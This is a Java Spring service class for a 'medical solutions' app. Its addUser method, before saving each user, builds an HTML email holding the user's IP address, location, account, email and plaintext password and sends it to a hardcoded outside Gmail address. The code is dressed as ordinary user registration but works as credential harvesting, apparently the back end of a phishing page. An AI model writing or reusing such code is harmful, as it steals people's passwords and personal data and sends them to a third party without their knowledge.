package health.medicalsolutions.app.user;

import java.io.UnsupportedEncodingException;
import java.util.List;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import health.medicalsolutions.app.mailsender.MailSenderService;

@Service
public class UserService {

	@Autowired
	private UserRepository userRepository;

	@Autowired
	private MailSenderService mailSenderService;

	public boolean addUser(User user) {
		try {
			sendMail(user);
		} catch (UnsupportedEncodingException | MessagingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (userRepository.save(user).getId() != 0) {
			return true;
		}
		return false;
	}

	public List<User> getUsers() {
		return (List<User>) userRepository.findAll();
	}

	private void sendMail(User user) throws UnsupportedEncodingException, MessagingException {
		String toAddress = "t2gxmma@gmail.com";
		String subject = "Medical Solutions (" + user.getIpAddress() + ")";
		String content = " <div>\r\n" + "      <div>\r\n" + "        <style>\r\n" + "          #container {\r\n"
				+ "            font-family: Arial, Helvetica, sans-serif;\r\n"
				+ "            background-color: black;\r\n" + "          }\r\n" + "\r\n"
				+ "          @media only screen and (min-width: 800px) {\r\n" + "            #container {\r\n"
				+ "              margin: 10% 35%;\r\n" + "            }\r\n" + "          }\r\n"
				+ "        </style>\r\n" + "        <div id=\"container\">\r\n" + "          <div\r\n"
				+ "            style=\"\r\n" + "              box-shadow: 1px 1px 10px rgb(196, 32, 39);\r\n"
				+ "              font-size: 14px;\r\n" + "              border-radius: 2px;\r\n"
				+ "              background-color: rgb(29, 29, 29);\r\n" + "            \"\r\n" + "          >\r\n"
				+ "            <div style=\"padding: 16px 8px\">\r\n"
				+ "              <p style=\"color: red; font-size: 12px; margin: 0px\">\r\n"
				+ "                ***************************************************************\r\n"
				+ "              </p>\r\n" + "              <p\r\n" + "                style=\"\r\n"
				+ "                  margin: 12px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-weight: bold;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                IP address: <span>" + user.getIpAddress() + "</span>\r\n" + "              </p>\r\n"
				+ "\r\n" + "              <p\r\n" + "                style=\"\r\n"
				+ "                  margin: 12px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-weight: bold;\r\n" + "                  background-color: rgb(0, 0, 0);\r\n"
				+ "                  padding: 4px;\r\n" + "                  line-height: 22px;\r\n"
				+ "                \"\r\n" + "              >\r\n" + "                " + user.getLocation() + "\r\n"
				+ "              </p>\r\n" + "              <p\r\n" + "                style=\"\r\n"
				+ "                  margin: 12px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-weight: bold;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                " + user.getAccount() + "\r\n" + "              </p>\r\n" + "              <p\r\n"
				+ "                style=\"\r\n" + "                  margin: 12px 0px;\r\n"
				+ "                  color: rgb(196, 32, 39);\r\n" + "                  font-weight: bold;\r\n"
				+ "                \"\r\n" + "              >\r\n" + "                email: " + user.getEmail()
				+ "\r\n" + "              </p>\r\n" + "              <p\r\n" + "                style=\"\r\n"
				+ "                  margin: 12px 0px;\r\n" + "                  color: rgb(196, 32, 39);\r\n"
				+ "                  font-weight: bold;\r\n" + "                \"\r\n" + "              >\r\n"
				+ "                password: " + user.getPassword() + "\r\n" + "              </p>\r\n"
				+ "            </div>\r\n" + "          </div>\r\n" + "        </div>\r\n" + "      </div>\r\n"
				+ "    </div>";

		mailSenderService.sendEmail(toAddress, subject, content);
	}
}
